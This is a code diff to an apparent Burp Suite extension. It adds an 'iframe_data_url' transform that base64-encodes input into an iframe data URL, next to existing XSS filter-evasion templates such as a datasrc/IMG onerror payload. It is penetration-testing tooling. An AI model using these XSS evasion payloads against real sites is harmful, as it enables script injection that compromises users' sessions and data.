@@ -572,6 +572,7 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
 			tags.add(new Tag("XSS","css_expression"));
 			tags.add(new Tag("XSS","datasrc"));
 			tags.add(new Tag("XSS","eval_fromcharcode"));
+			tags.add(new Tag("XSS","iframe_data_url"));
 		}
 		public String html_entities(String str) {
 			return StringEscapeUtils.escapeHtml4(str);
@@ -932,6 +933,9 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
 		public String datasrc(String str) {
 			return "<xml ID=xss><x><B>&lt;IMG src=1 onerror="+str+"&gt;</B></x></xml><SPAN DATASRC=#xss DATAFLD=B DATAFORMATAS=HTML></SPAN>";
 		}
+		public String iframe_data_url(String str) {
+			return "<iframe src=data:text/html;base64,"+this.base64Encode(str)+">";
+		}
 		private String callTag(String tag, String output, ArrayList<String> arguments) {
 			if(tag.equals("html_entities")) {
 				output = this.html_entities(output);
@@ -1045,6 +1049,8 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
 				output = this.datasrc(output);		
 			} else if(tag.equals("eval_fromcharcode")) {
 				output = this.eval_fromcharcode(output);
+			} else if(tag.equals("iframe_data_url")) {
+				output = this.iframe_data_url(output);
 			}
 			return output;
 		}
